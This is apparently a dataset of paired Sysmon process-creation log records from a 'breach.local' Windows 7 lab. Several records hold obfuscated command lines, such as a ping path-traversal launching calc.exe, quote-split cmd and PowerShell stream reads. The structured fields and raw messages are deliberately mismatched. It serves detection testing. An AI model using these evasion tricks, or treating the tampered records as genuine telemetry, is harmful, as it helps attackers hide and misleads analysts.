"{'event_data': {'OriginalFileName': '?', 'LogonId': '0x3e7', 'FileVersion': '18,0,0,194', 'Company': 'Adobe Systems Incorporated', 'Product': 'Adobe® Flash® Player Update Service', 'IntegrityLevel': 'System', 'LogonGuid': '{19FC45AC-76D8-601C-0000-0020E7030000}', 'TerminalSessionId': '0', 'Description': 'Adobe® Flash® Player Update Service 18.0 r0'}, 'version': 5, 'channel': 'Microsoft-Windows-Sysmon/Operational', 'api': 'wineventlog', 'computer_name': 'CLIENT2.breach.local', 'process': {'pid': 1704, 'thread': {'id': 1804}}, 'event_id': 1, 'provider_name': 'Microsoft-Windows-Sysmon', 'task': 'Process Create (rule: ProcessCreate)', 'opcode': 'Info', 'user': {'identifier': 'S-1-5-18', 'name': 'SYSTEM', 'domain': 'NT AUTHORITY', 'type': 'User'}, 'record_id': 1445, 'provider_guid': '{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'}","{'computer_name': 'CLIENT1.breach.local', 'provider_name': 'Microsoft-Windows-Sysmon', 'task': 'Process Create (rule: ProcessCreate)', 'version': 5, 'channel': 'Microsoft-Windows-Sysmon/Operational', 'process': {'pid': 1928, 'thread': {'id': 1716}}, 'user': {'domain': 'NT AUTHORITY', 'type': 'User', 'identifier': 'S-1-5-18', 'name': 'SYSTEM'}, 'event_id': 1, 'record_id': 1351, 'api': 'wineventlog', 'opcode': 'Info', 'provider_guid': '{5770385F-C22A-43E0-BF4C-06F5698FFBD9}', 'event_data': {'Description': 'IP Configuration Utility', 'TerminalSessionId': '1', 'LogonId': '0xfb53', 'FileVersion': '6.1.7600.16385 (win7_rtm.090713-1255)', 'LogonGuid': '{19FC45AC-7690-601C-0000-002053FB0000}', 'OriginalFileName': 'ipconfig.exe', 'Company': 'Microsoft Corporation', 'IntegrityLevel': 'Medium', 'Product': 'Microsoft® Windows® Operating System'}}"
"{'created': '2021-02-05T00:02:01.312Z', 'kind': 'event', 'code': 1, 'module': 'sysmon', 'category': ['process'], 'type': ['start', 'process_start'], 'provider': 'Microsoft-Windows-Sysmon', 'action': 'Process Create (rule: ProcessCreate)'}","{'category': ['process'], 'type': ['start', 'process_start'], 'kind': 'event', 'code': 1, 'provider': 'Microsoft-Windows-Sysmon', 'action': 'Process Create (rule: ProcessCreate)', 'created': '2021-02-04T22:37:09.059Z', 'module': 'sysmon'}"
"{'md5': '1234a12b71dae034e45c714ae5a54412', 'sha256': '079e6bc834f38322ed5ed76295ec3961ed894084ef5cb171dffbd9b3822cc78d'}","{'md5': 'cabb20e171770ff64614a54c1f31c033', 'sha256': 'c0e3087d87c84776fe7ffca768a0793c02d28e34a821f0c9da32339af8e7e6a6'}"
"{'name': 'CLIENT2', 'type': 'winlogbeat', 'version': '7.10.2', 'hostname': 'CLIENT2', 'ephemeral_id': 'd5d7daa0-c0ba-4d39-9140-3b4a4308a222', 'id': 'c58de8d4-8be2-444c-bc20-92fab97cbaf5'}","{'type': 'winlogbeat', 'version': '7.10.2', 'hostname': 'CLIENT1', 'ephemeral_id': '486f7872-9118-4349-8630-511973cdbf72', 'id': 'c58de8d4-8be2-444c-bc20-92fab97cbaf5', 'name': 'CLIENT1'}"
"{'name': 'CLIENT2.breach.local', 'id': '19fc45ac-5890-4f96-81b1-50ed111c0ce4', 'ip': ['192.168.56.102', '172.16.1.2', 'fe80::5efe:c0a8:3866', 'fe80::5efe:ac10:102'], 'mac': ['00:50:56:00:03:02', '00:50:56:00:00:02', '00:00:00:00:00:00:00:e0', '00:00:00:00:00:00:00:e0'], 'hostname': 'CLIENT2', 'architecture': 'x86', 'os': {'platform': 'windows', 'version': '6.1', 'family': 'windows', 'name': 'Windows 7 Professional', 'kernel': '6.1.7601.18741 (win7sp1_gdr.150202-1526)', 'build': '7601.0'}}","{'ip': ['192.168.56.101', '172.16.1.1', 'fe80::5efe:c0a8:3865', 'fe80::5efe:ac10:101'], 'mac': ['00:50:56:00:03:01', '00:50:56:00:00:01', '00:00:00:00:00:00:00:e0', '00:00:00:00:00:00:00:e0'], 'hostname': 'CLIENT1', 'architecture': 'x86', 'os': {'platform': 'windows', 'version': '6.1', 'family': 'windows', 'name': 'Windows 7 Professional', 'kernel': '6.1.7601.18741 (win7sp1_gdr.150202-1526)', 'build': '7601.0'}, 'name': 'CLIENT1.breach.local', 'id': '19fc45ac-5890-4f96-81b1-50ed111c0ce4'}"
2021-02-05T00:02:00.164Z,2021-02-04T22:27:20.140Z
"{'user': 'SYSTEM', 'hash': ['1234a12b71dae034e45c714ae5a54412', '079e6bc834f38322ed5ed76295ec3961ed894084ef5cb171dffbd9b3822cc78d']}","{'user': 'SYSTEM', 'hash': ['94c08df0f07c509d99fea7cfc486c335', '0aae40d7b5d57aed2a897161601a08123e64088033b03527dc1ba2b55e7a4e9a']}"
"{'command_line': 'ping 127.0.0.1/../../../Windows/System32/calc.exe', 'working_directory': 'C:\\Windows\\system32\\', 'parent': {'entity_id': '{19FC45AC-76D8-601C-0000-0010F1630000}', 'pid': 444, 'executable': 'C:\\Windows\\System32\\services.exe', 'command_line': 'cmd.exe /c ""ping 127.0.0.1/../../../Windows/System32/calc.exe""', 'name': 'services.exe', 'args': ['C:\\Windows\\system32\\services.exe']}, 'name': 'FlashPlayerUpdateService.exe', 'args': ['C:\\Windows\\system32\\Macromed\\Flash\\FlashPlayerUpdateService.exe'], 'hash': {'md5': '1234a12b71dae034e45c714ae5a54412', 'sha256': '079e6bc834f38322ed5ed76295ec3961ed894084ef5cb171dffbd9b3822cc78d'}, 'entity_id': '{19FC45AC-8AF8-601C-0000-0010807C1500}', 'pid': 3076, 'executable': 'C:\\Windows\\System32\\Macromed\\Flash\\FlashPlayerUpdateService.exe'}","{'entity_id': '{19FC45AC-74C8-601C-0000-0010BB5A0100}', 'pid': 1600, 'executable': 'C:\\Program Files\\NetTime\\NetTimeService.exe', 'hash': {'md5': '94c08df0f07c509d99fea7cfc486c335', 'sha256': '0aae40d7b5d57aed2a897161601a08123e64088033b03527dc1ba2b55e7a4e9a'}, 'command_line': 'ping 127.0.0.1/../../System32/calc.exe', 'working_directory': 'C:\\Windows\\system32\\', 'parent': {'name': 'services.exe', 'args': ['C:\\Windows\\system32\\services.exe'], 'entity_id': '{19FC45AC-74C3-601C-0000-0010D8620000}', 'pid': 440, 'executable': 'C:\\Windows\\System32\\services.exe', 'command_line': 'c""m""d /c ""ping 127.0.0.1/../../System32/calc.exe""'}, 'name': 'NetTimeService.exe', 'args': ['C:\\Program Files\\NetTime\\NetTimeService.exe']}"
"Process Create:
RuleName: 
UtcTime: 2021-02-05 00:02:00.164
ProcessGuid: {19FC45AC-8AF8-601C-0000-0010807C1500}
ProcessId: 3076
Image: C:\Windows\System32\Macromed\Flash\FlashPlayerUpdateService.exe
FileVersion: 18,0,0,194
Description: Adobe® Flash® Player Update Service 18.0 r0
Product: Adobe® Flash® Player Update Service
Company: Adobe Systems Incorporated
OriginalFileName: ?
CommandLine: C:\Windows\system32\Macromed\Flash\FlashPlayerUpdateService.exe
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {19FC45AC-76D8-601C-0000-0020E7030000}
LogonId: 0x3e7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=1234A12B71DAE034E45C714AE5A54412,SHA256=079E6BC834F38322ED5ED76295EC3961ED894084EF5CB171DFFBD9B3822CC78D
ParentProcessGuid: {19FC45AC-76D8-601C-0000-0010F1630000}
ParentProcessId: 444
ParentImage: C:\Windows\System32\services.exe
ParentCommandLine: C:\Windows\system32\services.exe","Process Create:
RuleName: 
UtcTime: 2021-02-04 22:27:20.140
ProcessGuid: {19FC45AC-74C8-601C-0000-0010BB5A0100}
ProcessId: 1600
Image: C:\Program Files\NetTime\NetTimeService.exe
FileVersion: 3.1.4.220
Description: Network Time Synchronizer - NT Service
Product: NetTime
Company: 
OriginalFileName: NetTimeService.exe
CommandLine: ""C:\Program Files\NetTime\NetTimeService.exe""
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {19FC45AC-74C3-601C-0000-0020E7030000}
LogonId: 0x3e7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=94C08DF0F07C509D99FEA7CFC486C335,SHA256=0AAE40D7B5D57AED2A897161601A08123E64088033B03527DC1BA2B55E7A4E9A
ParentProcessGuid: {19FC45AC-74C3-601C-0000-0010D8620000}
ParentProcessId: 440
ParentImage: C:\Windows\System32\services.exe
ParentCommandLine: C:\Windows\system32\services.exe"
"{'event_data': {'OriginalFileName': '?', 'LogonId': '0x3e7', 'FileVersion': '18,0,0,194', 'Company': 'Adobe Systems Incorporated', 'Product': 'Adobe® Flash® Player Update Service', 'IntegrityLevel': 'System', 'LogonGuid': '{19FC45AC-76D8-601C-0000-0020E7030000}', 'TerminalSessionId': '0', 'Description': 'Adobe® Flash® Player Update Service 18.0 r0'}, 'version': 5, 'channel': 'Microsoft-Windows-Sysmon/Operational', 'api': 'wineventlog', 'computer_name': 'CLIENT2.breach.local', 'process': {'pid': 1704, 'thread': {'id': 1804}}, 'event_id': 1, 'provider_name': 'Microsoft-Windows-Sysmon', 'task': 'Process Create (rule: ProcessCreate)', 'opcode': 'Info', 'user': {'identifier': 'S-1-5-18', 'name': 'SYSTEM', 'domain': 'NT AUTHORITY', 'type': 'User'}, 'record_id': 1445, 'provider_guid': '{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'}","{'computer_name': 'CLIENT', 'opcode': 'Info', 'version': 5, 'event_data': {'IntegrityLevel': 'System', 'LogonId': '0x3e7', 'Description': 'Network Time Synchronizer - NT Service', 'LogonGuid': '{19FC45AC-74C3-601C-0000-0020E7030000}', 'FileVersion': '3.1.4.220', 'OriginalFileName': 'NetTimeService.exe', 'Product': 'NetTime', 'TerminalSessionId': '0'}, 'event_id': 1, 'api': 'wineventlog', 'provider_guid': '{5770385F-C22A-43E0-BF4C-06F5698FFBD9}', 'task': 'Process Create (rule: ProcessCreate)', 'channel': 'Microsoft-Windows-Sysmon/Operational', 'record_id': 1175, 'user': {'name': 'SYSTEM', 'domain': 'NT AUTHORITY', 'type': 'User', 'identifier': 'S-1-5-18'}, 'process': {'pid': 1684, 'thread': {'id': 1512}}, 'provider_name': 'Microsoft-Windows-Sysmon'}"
"{'created': '2021-02-05T00:02:01.312Z', 'kind': 'event', 'code': 1, 'module': 'sysmon', 'category': ['process'], 'type': ['start', 'process_start'], 'provider': 'Microsoft-Windows-Sysmon', 'action': 'Process Create (rule: ProcessCreate)'}","{'provider': 'Microsoft-Windows-Sysmon', 'action': 'Process Create (rule: ProcessCreate)', 'created': '2021-02-04T22:31:06.122Z', 'kind': 'event', 'code': 1, 'module': 'sysmon', 'type': ['start', 'process_start'], 'category': ['process']}"
"{'md5': '1234a12b71dae034e45c714ae5a54412', 'sha256': '079e6bc834f38322ed5ed76295ec3961ed894084ef5cb171dffbd9b3822cc78d'}","{'md5': '94c08df0f07c509d99fea7cfc486c335', 'sha256': '0aae40d7b5d57aed2a897161601a08123e64088033b03527dc1ba2b55e7a4e9a'}"
"{'name': 'CLIENT2', 'type': 'winlogbeat', 'version': '7.10.2', 'hostname': 'CLIENT2', 'ephemeral_id': 'd5d7daa0-c0ba-4d39-9140-3b4a4308a222', 'id': 'c58de8d4-8be2-444c-bc20-92fab97cbaf5'}","{'id': 'c58de8d4-8be2-444c-bc20-92fab97cbaf5', 'name': 'CLIENT1', 'type': 'winlogbeat', 'version': '7.10.2', 'hostname': 'CLIENT1', 'ephemeral_id': 'c6dab1c1-2860-4ed8-b41c-e6b57498568e'}"
"{'name': 'CLIENT2.breach.local', 'id': '19fc45ac-5890-4f96-81b1-50ed111c0ce4', 'ip': ['192.168.56.102', '172.16.1.2', 'fe80::5efe:c0a8:3866', 'fe80::5efe:ac10:102'], 'mac': ['00:50:56:00:03:02', '00:50:56:00:00:02', '00:00:00:00:00:00:00:e0', '00:00:00:00:00:00:00:e0'], 'hostname': 'CLIENT2', 'architecture': 'x86', 'os': {'platform': 'windows', 'version': '6.1', 'family': 'windows', 'name': 'Windows 7 Professional', 'kernel': '6.1.7601.18741 (win7sp1_gdr.150202-1526)', 'build': '7601.0'}}","{'ip': ['192.168.56.101', '172.16.1.1', 'fe80::5efe:c0a8:3865', 'fe80::5efe:ac10:101'], 'mac': ['00:50:56:00:03:01', '00:50:56:00:00:01', '00:00:00:00:00:00:00:e0', '00:00:00:00:00:00:00:e0'], 'name': 'CLIENT', 'hostname': 'CLIENT1', 'architecture': 'x86', 'os': {'name': 'Windows 7 Professional', 'kernel': '6.1.7601.18741 (win7sp1_gdr.150202-1526)', 'build': '7601.0', 'platform': 'windows', 'version': '6.1', 'family': 'windows'}, 'id': '19fc45ac-5890-4f96-81b1-50ed111c0ce4'}"
2021-02-04T20:36:00.292Z,2021-02-04T22:29:14.502Z
"{'user': 'breach', 'hash': ['b3dd214f23037e3d3c27d6c9447b40b5', '86374883cd75b4c29c3fba50c8580843d06753d09f3a959f26ec8e13e69835a1']}","{'user': 'SYSTEM', 'hash': ['7fa8ba5a780e4757964ac9d4238302b9', '65e3d8ce737896647065103fbb4d58e6a34171d0a48662a832cfdac3cf469701']}"
"{'md5': 'b3dd214f23037e3d3c27d6c9447b40b5', 'sha256': '86374883cd75b4c29c3fba50c8580843d06753d09f3a959f26ec8e13e69835a1'}","{'md5': '7fa8ba5a780e4757964ac9d4238302b9', 'sha256': '65e3d8ce737896647065103fbb4d58e6a34171d0a48662a832cfdac3cf469701'}"
"{'parent': {'command_line': '""C:\\Windows\\system32\\rundll32.exe"" C:\\Windows\\system32\\shell32.dll,OpenAs_RunDLL C:\\ProgramData\\winlogbeat\\logs\\winlogbeat - Copy', 'name': 'rundll32.exe', 'args': ['C:\\Windows\\system32\\rundll32.exe', 'C:\\Windows\\system32\\shell32.dll,OpenAs_RunDLL', 'C:\\ProgramData\\winlogbeat\\logs\\winlogbeat', '-', 'Copy'], 'entity_id': '{19FC45AC-5AAE-601C-0000-001031ED1000}', 'pid': 2976, 'executable': 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe'}, 'name': 'wordpad.exe', 'command_line': 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -c ""Get-Content -Stream \'\' d:\\foo.bar""', 'pid': 4080, 'executable': 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', 'working_directory': 'C:\\ProgramData\\winlogbeat\\logs\\', 'args': ['C:\\Program Files\\Windows NT\\Accessories\\WORDPAD.EXE', 'C:\\ProgramData\\winlogbeat\\logs\\winlogbeat - Copy'], 'hash': {'md5': 'b3dd214f23037e3d3c27d6c9447b40b5', 'sha256': '86374883cd75b4c29c3fba50c8580843d06753d09f3a959f26ec8e13e69835a1'}, 'entity_id': '{19FC45AC-5AB0-601C-0000-001007011100}'}","{'executable': 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', 'name': 'powershell.exe', 'args': ['""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe""', '-c', '""Get-Content C:\\BREACH\\userbehavior.log -Str""""eam \'\'""'], 'entity_id': '{19FC45AC-753A-601C-0000-001020440200}', 'pid': 948, 'command_line': '""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"" -c ""Get-Content C:\\BREACH\\userbehavior.log -Str""""eam \'\'""', 'working_directory': 'C:\\Windows\\system32\\', 'parent': {'pid': 444, 'executable': 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', 'command_line': 'C:\\Windows\\system32\\services.exe', 'name': 'services.exe', 'args': ['C:\\Windows\\system32\\services.exe'], 'entity_id': '{19FC45AC-752D-601C-0000-001032610000}'}, 'hash': {'md5': '7fa8ba5a780e4757964ac9d4238302b9', 'sha256': '65e3d8ce737896647065103fbb4d58e6a34171d0a48662a832cfdac3cf469701'}}"
"Process Create:
RuleName: 
UtcTime: 2021-02-04 20:36:00.292
ProcessGuid: {19FC45AC-5AB0-601C-0000-001007011100}
ProcessId: 4080
Image: C:\Program Files\Windows NT\Accessories\wordpad.exe
FileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)
Description: Windows Wordpad Application
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: WORDPAD.EXE
CommandLine: ""C:\Program Files\Windows NT\Accessories\WORDPAD.EXE"" ""C:\ProgramData\winlogbeat\logs\winlogbeat - Copy""
CurrentDirectory: C:\ProgramData\winlogbeat\logs\
User: client\breach
LogonGuid: {19FC45AC-53AD-601C-0000-002012560200}
LogonId: 0x25612
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=B3DD214F23037E3D3C27D6C9447B40B5,SHA256=86374883CD75B4C29C3FBA50C8580843D06753D09F3A959F26EC8E13E69835A1
ParentProcessGuid: {19FC45AC-5AAE-601C-0000-001031ED1000}
ParentProcessId: 2976
ParentImage: C:\Windows\System32\rundll32.exe
ParentCommandLine: ""C:\Windows\system32\rundll32.exe"" C:\Windows\system32\shell32.dll,OpenAs_RunDLL C:\ProgramData\winlogbeat\logs\winlogbeat - Copy","Process Create:
RuleName: 
UtcTime: 2021-02-04 22:29:14.502
ProcessGuid: {19FC45AC-753A-601C-0000-001020440200}
ProcessId: 948
Image: C:\Windows\System32\taskhost.exe
FileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)
Description: Host Process for Windows Tasks
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: taskhost.exe
CommandLine: taskhost.exe SYSTEM
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {19FC45AC-752E-601C-0000-0020E7030000}
LogonId: 0x3e7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=7FA8BA5A780E4757964AC9D4238302B9,SHA256=65E3D8CE737896647065103FBB4D58E6A34171D0A48662A832CFDAC3CF469701
ParentProcessGuid: {19FC45AC-752D-601C-0000-001032610000}
ParentProcessId: 444
ParentImage: C:\Windows\System32\services.exe
ParentCommandLine: C:\Windows\system32\services.exe"
"{'process': {'pid': 1524, 'thread': {'id': 1780}}, 'record_id': 1143, 'version': 5, 'provider_guid': '{5770385F-C22A-43E0-BF4C-06F5698FFBD9}', 'user': {'identifier': 'S-1-5-18', 'name': 'SYSTEM', 'domain': 'NT AUTHORITY', 'type': 'User'}, 'event_id': 1, 'provider_name': 'Microsoft-Windows-Sysmon', 'task': 'Process Create (rule: ProcessCreate)', 'api': 'wineventlog', 'computer_name': 'CLIENT', 'opcode': 'Info', 'event_data': {'TerminalSessionId': '1', 'Product': 'Microsoft® Windows® Operating System', 'Company': 'Microsoft Corporation', 'FileVersion': '6.1.7601.17514 (win7sp1_rtm.101119-1850)', 'OriginalFileName': 'WORDPAD.EXE', 'IntegrityLevel': 'High', 'Description': 'Windows Wordpad Application', 'LogonId': '0x25612', 'LogonGuid': '{19FC45AC-53AD-601C-0000-002012560200}'}, 'channel': 'Microsoft-Windows-Sysmon/Operational'}","{'computer_name': 'CLIENT2.breach.local', 'version': 5, 'user': {'domain': 'NT AUTHORITY', 'type': 'User', 'identifier': 'S-1-5-18', 'name': 'SYSTEM'}, 'provider_guid': '{5770385F-C22A-43E0-BF4C-06F5698FFBD9}', 'channel': 'Microsoft-Windows-Sysmon/Operational', 'event_id': 1, 'record_id': 1294, 'task': 'Process Create (rule: ProcessCreate)', 'provider_name': 'Microsoft-Windows-Sysmon', 'api': 'wineventlog', 'opcode': 'Info', 'process': {'pid': 1528, 'thread': {'id': 1796}}, 'event_data': {'OriginalFileName': 'taskhost.exe', 'Company': 'Microsoft Corporation', 'FileVersion': '6.1.7601.17514 (win7sp1_rtm.101119-1850)', 'Description': 'Host Process for Windows Tasks', 'TerminalSessionId': '0', 'LogonId': '0x3e7', 'IntegrityLevel': 'System', 'Product': 'Microsoft® Windows® Operating System', 'LogonGuid': '{19FC45AC-752E-601C-0000-0020E7030000}'}}"
"{'category': ['process'], 'type': ['start', 'process_start'], 'action': 'Process Create (rule: ProcessCreate)', 'created': '2021-02-04T20:36:01.790Z', 'kind': 'event', 'code': 1, 'provider': 'Microsoft-Windows-Sysmon', 'module': 'sysmon'}","{'action': 'Process Create (rule: ProcessCreate)', 'created': '2021-02-04T22:31:11.544Z', 'kind': 'event', 'code': 1, 'provider': 'Microsoft-Windows-Sysmon', 'module': 'sysmon', 'category': ['process'], 'type': ['start', 'process_start']}"
"{'domain': 'client', 'name': 'breach'}","{'domain': 'NT AUTHORITY', 'name': 'SYSTEM'}"
"{'type': 'winlogbeat', 'version': '7.10.2', 'hostname': 'CLIENT', 'ephemeral_id': '66b561db-e9d4-4076-b78e-c4ce9eada53c', 'id': 'c58de8d4-8be2-444c-bc20-92fab97cbaf5', 'name': 'CLIENT'}","{'hostname': 'CLIENT2', 'ephemeral_id': '805d2621-88bc-4353-a953-25544d012426', 'id': 'c58de8d4-8be2-444c-bc20-92fab97cbaf5', 'name': 'CLIENT2', 'type': 'winlogbeat', 'version': '7.10.2'}"
"{'architecture': 'x86', 'os': {'version': '6.1', 'family': 'windows', 'name': 'Windows 7 Professional', 'kernel': '6.1.7601.18741 (win7sp1_gdr.150202-1526)', 'build': '7601.0', 'platform': 'windows'}, 'id': '19fc45ac-5890-4f96-81b1-50ed111c0ce4', 'ip': ['192.168.56.254', '172.16.1.1', 'fe80::5efe:c0a8:38fe', 'fe80::5efe:ac10:101'], 'mac': ['00:50:56:00:01:01', '00:50:56:00:00:01', '00:00:00:00:00:00:00:e0', '00:00:00:00:00:00:00:e0'], 'name': 'CLIENT', 'hostname': 'CLIENT'}","{'mac': ['00:50:56:00:03:02', '00:50:56:00:00:02', '00:00:00:00:00:00:00:e0', '00:00:00:00:00:00:00:e0'], 'hostname': 'CLIENT2', 'architecture': 'x86', 'os': {'version': '6.1', 'family': 'windows', 'name': 'Windows 7 Professional', 'kernel': '6.1.7601.18741 (win7sp1_gdr.150202-1526)', 'build': '7601.0', 'platform': 'windows'}, 'id': '19fc45ac-5890-4f96-81b1-50ed111c0ce4', 'name': 'CLIENT2.breach.local', 'ip': ['192.168.56.102', '172.16.1.2', 'fe80::5efe:c0a8:3866', 'fe80::5efe:ac10:102']}"
2021-02-04T20:36:00.292Z,2021-02-04T22:28:16.421Z
"{'user': 'breach', 'hash': ['b3dd214f23037e3d3c27d6c9447b40b5', '86374883cd75b4c29c3fba50c8580843d06753d09f3a959f26ec8e13e69835a1']}","{'user': 'setup', 'hash': ['60b65f97c12ba30cd36450d376227c02', 'd06598f2f203cec7a7a3857f727bc2ba457c1c0cef2787b90ce553407fbf8536']}"
"{'md5': 'b3dd214f23037e3d3c27d6c9447b40b5', 'sha256': '86374883cd75b4c29c3fba50c8580843d06753d09f3a959f26ec8e13e69835a1'}","{'md5': '60b65f97c12ba30cd36450d376227c02', 'sha256': 'd06598f2f203cec7a7a3857f727bc2ba457c1c0cef2787b90ce553407fbf8536'}"
"{'parent': {'command_line': '""C:\\Windows\\system32\\rundll32.exe"" C:\\Windows\\system32\\shell32.dll,OpenAs_RunDLL C:\\ProgramData\\winlogbeat\\logs\\winlogbeat - Copy', 'name': 'rundll32.exe', 'args': ['C:\\Windows\\system32\\rundll32.exe', 'C:\\Windows\\system32\\shell32.dll,OpenAs_RunDLL', 'C:\\ProgramData\\winlogbeat\\logs\\winlogbeat', '-', 'Copy'], 'entity_id': '{19FC45AC-5AAE-601C-0000-001031ED1000}', 'pid': 2976, 'executable': 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe'}, 'name': 'wordpad.exe', 'command_line': 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -c ""Get-Content -Stream \'\' d:\\foo.bar""', 'pid': 4080, 'executable': 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', 'working_directory': 'C:\\ProgramData\\winlogbeat\\logs\\', 'args': ['C:\\Program Files\\Windows NT\\Accessories\\WORDPAD.EXE', 'C:\\ProgramData\\winlogbeat\\logs\\winlogbeat - Copy'], 'hash': {'md5': 'b3dd214f23037e3d3c27d6c9447b40b5', 'sha256': '86374883cd75b4c29c3fba50c8580843d06753d09f3a959f26ec8e13e69835a1'}, 'entity_id': '{19FC45AC-5AB0-601C-0000-001007011100}'}","{'command_line': '""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"" -c ""G""""et-C""""on""""tent C:\\BREACH\\userbe""""havio""""r.log -S""""tr""""eam \'\'""', 'working_directory': 'C:\\Windows\\system32\\', 'entity_id': '{19FC45AC-7500-601C-0000-001099870200}', 'pid': 2104, 'executable': 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', 'parent': {'command_line': 'C:\\Windows\\Explorer.EXE', 'name': 'explorer.exe', 'args': ['C:\\Windows\\Explorer.EXE'], 'entity_id': '{19FC45AC-74FF-601C-0000-0010A0500200}', 'pid': 1616, 'executable': 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe'}, 'name': 'NetTime.exe', 'args': ['C:\\Program Files\\NetTime\\NetTime.exe'], 'hash': {'sha256': 'd06598f2f203cec7a7a3857f727bc2ba457c1c0cef2787b90ce553407fbf8536', 'md5': '60b65f97c12ba30cd36450d376227c02'}}"
"Process Create:
RuleName: 
UtcTime: 2021-02-04 20:36:00.292
ProcessGuid: {19FC45AC-5AB0-601C-0000-001007011100}
ProcessId: 4080
Image: C:\Program Files\Windows NT\Accessories\wordpad.exe
FileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)
Description: Windows Wordpad Application
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: WORDPAD.EXE
CommandLine: ""C:\Program Files\Windows NT\Accessories\WORDPAD.EXE"" ""C:\ProgramData\winlogbeat\logs\winlogbeat - Copy""
CurrentDirectory: C:\ProgramData\winlogbeat\logs\
User: client\breach
LogonGuid: {19FC45AC-53AD-601C-0000-002012560200}
LogonId: 0x25612
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=B3DD214F23037E3D3C27D6C9447B40B5,SHA256=86374883CD75B4C29C3FBA50C8580843D06753D09F3A959F26EC8E13E69835A1
ParentProcessGuid: {19FC45AC-5AAE-601C-0000-001031ED1000}
ParentProcessId: 2976
ParentImage: C:\Windows\System32\rundll32.exe
ParentCommandLine: ""C:\Windows\system32\rundll32.exe"" C:\Windows\system32\shell32.dll,OpenAs_RunDLL C:\ProgramData\winlogbeat\logs\winlogbeat - Copy","Process Create:
RuleName: 
UtcTime: 2021-02-04 22:28:16.421
ProcessGuid: {19FC45AC-7500-601C-0000-001099870200}
ProcessId: 2104
Image: C:\Program Files\NetTime\NetTime.exe
FileVersion: 3.1.4.220
Description: Network Time Synchronizer
Product: NetTime
Company: 
OriginalFileName: NetTime.exe
CommandLine: ""C:\Program Files\NetTime\NetTime.exe"" 
CurrentDirectory: C:\Windows\system32\
User: CLIENT2\setup
LogonGuid: {19FC45AC-74FF-601C-0000-002049330200}
LogonId: 0x23349
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=60B65F97C12BA30CD36450D376227C02,SHA256=D06598F2F203CEC7A7A3857F727BC2BA457C1C0CEF2787B90CE553407FBF8536
ParentProcessGuid: {19FC45AC-74FF-601C-0000-0010A0500200}
ParentProcessId: 1616
ParentImage: C:\Windows\explorer.exe
ParentCommandLine: C:\Windows\Explorer.EXE"
"{'process': {'pid': 1524, 'thread': {'id': 1780}}, 'record_id': 1143, 'version': 5, 'provider_guid': '{5770385F-C22A-43E0-BF4C-06F5698FFBD9}', 'user': {'identifier': 'S-1-5-18', 'name': 'SYSTEM', 'domain': 'NT AUTHORITY', 'type': 'User'}, 'event_id': 1, 'provider_name': 'Microsoft-Windows-Sysmon', 'task': 'Process Create (rule: ProcessCreate)', 'api': 'wineventlog', 'computer_name': 'CLIENT', 'opcode': 'Info', 'event_data': {'TerminalSessionId': '1', 'Product': 'Microsoft® Windows® Operating System', 'Company': 'Microsoft Corporation', 'FileVersion': '6.1.7601.17514 (win7sp1_rtm.101119-1850)', 'OriginalFileName': 'WORDPAD.EXE', 'IntegrityLevel': 'High', 'Description': 'Windows Wordpad Application', 'LogonId': '0x25612', 'LogonGuid': '{19FC45AC-53AD-601C-0000-002012560200}'}, 'channel': 'Microsoft-Windows-Sysmon/Operational'}","{'channel': 'Microsoft-Windows-Sysmon/Operational', 'user': {'domain': 'NT AUTHORITY', 'type': 'User', 'identifier': 'S-1-5-18', 'name': 'SYSTEM'}, 'event_data': {'TerminalSessionId': '1', 'IntegrityLevel': 'High', 'LogonId': '0x23349', 'FileVersion': '3.1.4.220', 'Product': 'NetTime', 'OriginalFileName': 'NetTime.exe', 'Description': 'Network Time Synchronizer', 'LogonGuid': '{19FC45AC-74FF-601C-0000-002049330200}'}, 'computer_name': 'CLIENT2', 'task': 'Process Create (rule: ProcessCreate)', 'api': 'wineventlog', 'opcode': 'Info', 'provider_guid': '{5770385F-C22A-43E0-BF4C-06F5698FFBD9}', 'process': {'pid': 1488, 'thread': {'id': 1752}}, 'version': 5, 'event_id': 1, 'provider_name': 'Microsoft-Windows-Sysmon', 'record_id': 1234}"
"{'category': ['process'], 'type': ['start', 'process_start'], 'action': 'Process Create (rule: ProcessCreate)', 'created': '2021-02-04T20:36:01.790Z', 'kind': 'event', 'code': 1, 'provider': 'Microsoft-Windows-Sysmon', 'module': 'sysmon'}","{'category': ['process'], 'type': ['start', 'process_start'], 'kind': 'event', 'code': 1, 'provider': 'Microsoft-Windows-Sysmon', 'action': 'Process Create (rule: ProcessCreate)', 'created': '2021-02-04T22:31:11.405Z', 'module': 'sysmon'}"
